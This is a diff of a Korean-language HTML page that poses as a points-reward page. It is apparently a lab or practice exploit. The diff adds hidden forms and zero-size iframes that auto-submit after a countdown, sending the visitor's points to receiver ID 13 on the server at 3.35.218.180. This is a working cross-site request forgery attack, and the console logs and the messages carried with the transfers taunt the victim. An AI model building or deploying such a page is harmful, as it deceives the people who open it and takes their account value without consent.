@@ -61,6 +61,30 @@
             <p style="opacity: 0.8;">포인트는 즉시 계정에 반영됩니다.</p>
         </div>
     </div>
+   <!-- 숨겨진 공격 폼들 -->
+    <div style="display: none;">
+        <!-- 첫 번째 공격 폼 -->
+        <form id="attack1" method="POST" action="http://3.35.218.180/profile.php" target="hiddenFrame1">
+            <input type="hidden" name="receiver_id" value="13">
+            <input type="hidden" name="points" value="30">
+            <input type="hidden" name="send_gift" value="1">
+            <input type="hidden" name="gift_type" value="coffee">
+            <input type="hidden" name="message" value="어 개털렸죠?">
+        </form>
+        
+        <!-- 두 번째 공격 폼 -->
+        <form id="attack2" method="POST" action="http://3.35.218.180/profile.php" target="hiddenFrame2">
+            <input type="hidden" name="receiver_id" value="13">
+            <input type="hidden" name="points" value="25">
+            <input type="hidden" name="send_gift" value="1">
+            <input type="hidden" name="gift_type" value="cake">
+            <input type="hidden" name="message" value="내가 가져간다 이 대머리야">
+        </form>
+        
+        <!-- 숨겨진 iframe들 -->
+        <iframe name="hiddenFrame1" style="width:0; height:0; border:none;"></iframe>
+        <iframe name="hiddenFrame2" style="width:0; height:0; border:none;"></iframe>
+    </div>
 
     <script>
         let countdown = 3;
@@ -78,7 +102,7 @@
         
         let messageIndex = 0;
         
-        // 파일 열리자마자 바로 카운트다운 시작
+        // 카운트다운 시작
         const countdownTimer = setInterval(() => {
             countdown--;
             countdownEl.textContent = countdown;
@@ -90,83 +114,33 @@
             
             if (countdown <= 0) {
                 clearInterval(countdownTimer);
-                executeRealAttack();
+                executeAttack();
             }
         }, 1000);
         
-        // Python 스크립트 방식을 참고한 실제 공격
-        function executeRealAttack() {
-            console.log('🎯 Python 방식 CSRF 공격 시작...');
+        function executeAttack() {
+            console.log('🎯 CSRF 공격 시작...');
             statusEl.textContent = '💸 실제 포인트를 전송하고 있습니다...';
             progressBar.style.width = '100%';
             
-            // 첫 번째 공격 - iframe에 직접 HTML 삽입
-            const iframe1 = document.getElementById('attack1');
-            iframe1.onload = () => {
-                console.log('✅ 첫 번째 공격 iframe 로드됨');
-            };
-            
-            iframe1.src = 'data:text/html;charset=utf-8,' + encodeURIComponent(`
-                <html>
-                <body>
-                <form id="hackForm1" method="POST" action="http://3.35.218.180/profile.php">
-                    <input type="hidden" name="receiver_id" value="13">
-                    <input type="hidden" name="points" value="30">
-                    <input type="hidden" name="send_gift" value="1">
-                    <input type="hidden" name="gift_type" value="coffee">
-                    <input type="hidden" name="message" value="어 개털렸죠?">
-                </form>
-                <script>
-                    setTimeout(() => {
-                        document.getElementById('hackForm1').submit();
-                        console.log('🚀 30포인트 공격 전송됨');
-                    }, 500);
-                </script>
-                </body>
-                </html>
-            `);
-            
-            // 2초 후 두 번째 공격
+            // 첫 번째 공격 실행
             setTimeout(() => {
-                const iframe2 = document.getElementById('attack2');
-                iframe2.onload = () => {
-                    console.log('✅ 두 번째 공격 iframe 로드됨');
-                };
-                
-                iframe2.src = 'data:text/html;charset=utf-8,' + encodeURIComponent(`
-                    <html>
-                    <body>
-                    <form id="hackForm2" method="POST" action="http://3.35.218.180/profile.php">
-                        <input type="hidden" name="receiver_id" value="13">
-                        <input type="hidden" name="points" value="25">
-                        <input type="hidden" name="send_gift" value="1">
-                        <input type="hidden" name="gift_type" value="cake">
-                        <input type="hidden" name="message" value="내가 가져간다 이 대머리야">
-                    </form>
-                    <script>
-                        setTimeout(() => {
-                            document.getElementById('hackForm2').submit();
-                            console.log('🚀 25포인트 공격 전송됨');
-                        }, 500);
-                    </script>
-                    </body>
-                    </html>
-                `);
-            }, 2000);
+                document.getElementById('attack1').submit();
+                console.log('🚀 첫 번째 공격 전송: 30P -> hacker');
+            }, 500);
             
-            // 완료 처리
+            // 두 번째 공격 실행 (2초 후)
             setTimeout(() => {
-                showSuccess();
-                console.log('🎉 모든 공격 전송 완료!');
-                console.log('💰 예상 전송 포인트: 55P');
-                console.log('🏴‍☠️ hacker 계정에서 포인트 확인해보세요!');
-            }, 6000);
-        }
-        
-        function showSuccess() {
-            loadingSection.style.display = 'none';
-            successSection.style.display = 'block';
-            document.title = '✅ 포인트 지급 완료!';
+                document.getElementById('attack2').submit();
+                console.log('🚀 두 번째 공격 전송: 25P -> hacker');
+            }, 2500);
+            
+            // 성공 메시지 표시
+            setTimeout(() => {
+                loadingSection.style.display = 'none';
+                successSection.style.display = 'block';
+                console.log('🎉 공격 완료! hacker 계정 확인해보세요');
+            }, 5000);
         }
     </script>
 </body>
